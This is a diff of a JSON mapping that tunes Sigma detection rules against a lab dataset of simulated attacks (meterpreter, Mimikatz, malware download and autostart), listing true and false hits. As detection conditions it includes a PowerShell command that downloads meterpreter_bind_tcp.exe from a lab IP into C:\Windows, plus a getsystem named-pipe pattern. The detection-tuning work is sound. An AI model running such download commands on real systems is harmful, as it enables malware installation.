@@ -4,10 +4,10 @@
   "Cleartext Protocol Usage": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/compliance/netflow_cleartext_protocols.yml",
     "_true_hits": [
-      "Communication of the meterpreter .exe with the attacker | EmailAttackEXE",
-      "Communication of the meterpreter .exe with the attacker | TakeScreenshotAttack",
       "Communication of the meterpreter .exe with the attacker | C2ExfiltrationAttack",
-      "Communication of the meterpreter .exe with the attacker | MimikatzAttack"
+      "Communication of the meterpreter .exe with the attacker | DownloadMalwareAttack",
+      "Communication of the meterpreter .exe with the attacker | MimikatzAttack",
+      "Communication of the meterpreter .exe with the attacker | TakeScreenshotAttack"
     ],
     "_false_hits": [
       "OneDrive connects to EdgeCast via 93.184.220.29:80, see https://mspoweruser.com/microsoft-partners-with-verizon-to-use-edgecast-cdn-for-its-media-services/"
@@ -29,8 +29,8 @@
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_conhost.yml",
     "_true_hits": [
       "Command to download malware | DownloadMalwareAttack",
-      "Command to change registry for autostart | SetAutostartAttack",
-      "Command to run malware via schtask | ExecuteMalwareAttack"
+      "Command to run malware via schtask | ExecuteMalwareAttack",
+      "Command to change registry for autostart | SetAutostartAttack"
     ],
     "_false_hits": [],
     "conditions": {
@@ -53,8 +53,8 @@
   "Creation of an Executable by an Executable": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/file_event/file_event_win_susp_dropper.yml",
     "_true_hits": [
-      "Creation of Bank-of-Nuthington.exe by python.exe (userbehavior) | EmailEXEAttack",
-      "Creation of meterpreter_bind_tcp.exe by powershell.exe | DownloadMalwareAttack"
+      "Creation of meterpreter_bind_tcp.exe by powershell.exe | DownloadMalwareAttack",
+      "Creation of Bank-of-Nuthington.exe by python.exe (userbehavior) | EmailEXEAttack"
     ],
     "_false_hits": [
       "OneDrive*.exe and derived processes"
@@ -87,43 +87,11 @@
   },
 
 
-  "DLL Load By System Process From Suspicious Locations": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/image_load/image_load_susp_dll_load_system_process.yml",
-    "_true_hits": [],
-    "_false_hits": [
-      "Desktop.ini created by setup process, executed on startup",
-      "__PSScriptPolicyTest_*.*.ps1",
-      "cleanmgr.exe"
-    ],
-    "conditions": {}
-  },
-
-
   "Encoded PowerShell Command Line Usage of ConvertTo-SecureString": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_powershell_cmdline_convertto_securestring.yml",
     "_true_hits": [],
     "_false_hits": [
       "init_tbf_client.py triggers this"
-    ],
-    "conditions": {}
-  },
-
-
-  "Execution Of Non-Existing File": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_image_missing.yml",
-    "_true_hits": [],
-    "_false_hits": [
-      "Seems very much like the SIGMA hits themselves are false positives, i.e. there is no file being called."
-    ],
-    "conditions": {}
-  },
-
-
-  "Execution of Suspicious File Type Extension": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_non_exe_image.yml",
-    "_true_hits": [],
-    "_false_hits": [
-      "Seems very much like the SIGMA hits themselves are false positives, i.e. there is no file being called."
     ],
     "conditions": {}
   },
@@ -180,7 +148,7 @@
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/builtin/system/win_lsasrv_ntlmv1.yml",
     "_true_hits": [],
     "_false_hits": [
-      "Simply triggered by the usage of NTLMv1 in our network"
+      "This event occurs once per boot of the server on the first time a client uses NTLM with this server"
     ],
     "conditions": {}
   },
@@ -210,20 +178,6 @@
         "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
       ]
     }
-  },
-
-
-  "PowerShell Scripts Run by a Services": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/driver_load/driver_load_powershell_script_installed_as_service.yml",
-    "_true_hits": [],
-    "_false_hits": [
-      "CLR usage logs",
-      "BitLocker",
-      "Creation of a ton of {some_hash}.tmp files???",
-      "mscorsvw.exe aka .NET framework optimization service",
-      "In general images that have 'powershell' even somewhere in their path"
-    ],
-    "conditions": {}
   },
 
 
@@ -259,9 +213,7 @@
     "_true_hits": [
       "Bank-of-Nuthington.exe being started | Various Attacks???"
     ],
-    "_false_hits": [
-      "DismHost.exe"
-    ],
+    "_false_hits": [],
     "conditions": {
       "entry1": [
         "document.data.process.name",
@@ -273,40 +225,14 @@
 
   "Rare Service Installation": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/builtin/system/win_rare_service_installs.yml",
-    "_true_hits": [],
-    "_false_hits": [],
-    "conditions": {}
-  },
-
-
-  "Raw Disk Access Using Illegitimate Tools": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/raw_access_thread/sysmon_raw_disk_access_using_illegitimate_tools.yml",
     "_true_hits": [
-      "Running meterpreter_bind_tcp.exe | ExecuteMalwareAttack",
-      "triggering_action_and_attack_name2"
+      "Usage of getsystem command by meterpreter | MimikatzAttack"
     ],
-    "_false_hits": [
-      "Literally thousands of false positives, most triggered by the userbehavior",
-      "Mailing, Writing, etc",
-      "geckodriver.exe",
-      "OneDriveSetup.exe"
-    ],
+    "_false_hits": [],
     "conditions": {
       "entry1": [
-        "document.data.process.name",
-        "meterpreter_bind_tcp.exe"
-      ],
-      "entry2": [
-        "document.data.process.name",
-        "Bank-of-Nuthington.exe"
-      ],
-      "entry3": [
-        "document.data.file.name",
-        "Bank-of-Nuthington.exe"
-      ],
-      "entry4": [
-        "document.data.destination.ip",
-        "172.18.0.3"
+        "document.data.winlog.event_data.ImagePath",
+        "cmd.exe /c echo ANY_WORD_CHARS > \\\\.\\pipe\\ANY_WORD_CHARS"
       ]
     }
   },
@@ -350,7 +276,7 @@
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/file_rename/file_rename_win_not_dll_to_dll.yml",
     "_true_hits": [],
     "_false_hits": [
-      "Possibly caused by flawed mapping, OriginalFilename field is always missing"
+      "Caused by flawed mapping, OriginalFilename field is almost always missing"
     ],
     "conditions": {}
   },
@@ -375,27 +301,10 @@
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/file_event/file_event_win_startup_folder_file_write.yml",
     "_true_hits": [],
     "_false_hits": [
-      "desktop.ini aka Client setup"
+      "desktop.ini aka Client setup",
+      "Explorer.exe for some reason"
     ],
     "conditions": {}
-  },
-
-
-  "Suspicious Driver Load from Temp": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/driver_load/driver_load_susp_temp_use.yml",
-    "_true_hits": [
-      "Bank-of-Nuthington.exe being started from Temp folder | EmailExeAttack"
-    ],
-    "_false_hits": [
-      "mscorsvw.exe",
-      "noscript.jar by userbehavior"
-    ],
-    "conditions": {
-      "entry1": [
-        "document.data.file.name",
-        "Bank-of-Nuthington.exe"
-      ]
-    }
   },
 
 
@@ -409,54 +318,22 @@
   },
 
 
-  "Suspicious Remote Thread Source": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/create_remote_thread/sysmon_susp_remote_thread_source.yml",
-    "_true_hits": [
-      "Scheduled tasks spawning a new thread | ExecuteMalwareAttack",
-      "Bank-of-Nuthington.exe doing meterpreter things | ???"
-    ],
-    "_false_hits": [
-      "spoolssv.exe",
-      "noscript.jar",
-      "Everything python-related"
-    ],
-    "conditions": {
-      "entry1": [
-        "document.data.process.name",
-        "schtasks.exe"
-      ],
-      "entry2": [
-        "document.data.file.name",
-        "Bank-of-Nuthington.exe"
-      ]
-    }
-  },
-
-
-  "Suspicious Schtasks Schedule Types": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_schtasks_schedule_type.yml",
-    "_true_hits": [],
-    "_false_hits": [],
-    "conditions": {}
-  },
-
-
-  "System DLL Sideloading From Non System Locations": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/image_load/image_load_side_load_from_non_system_location.yml",
-    "_true_hits": [],
-    "_false_hits": [
-      "cleanmgr.exe stores some .dlls in a temp folder",
-      "mscorsvw.exe sideloads windows.storage.dll"
-    ],
-    "conditions": {}
-  },
-
-
   "Verclsid.exe Runs COM Object": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_verclsid_runs_com.yml",
     "_true_hits": [],
     "_false_hits": [
-      "Seems to be legitimate activity of RuntimeBroker.exe"
+      "Seems to be legitimate activity of RuntimeBroker.exe???"
+    ],
+    "conditions": {}
+  },
+
+
+  "WMI Event Subscription": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Leap second config update",
+      "Last shutdown info"
     ],
     "conditions": {}
   },
@@ -486,17 +363,6 @@
         "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
       ]
     }
-  },
-
-
-  "WMI Event Subscription": {
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml",
-    "_true_hits": [],
-    "_false_hits": [
-      "Leap second config update",
-      "Last shutdown info"
-    ],
-    "conditions": {}
   },
 
 
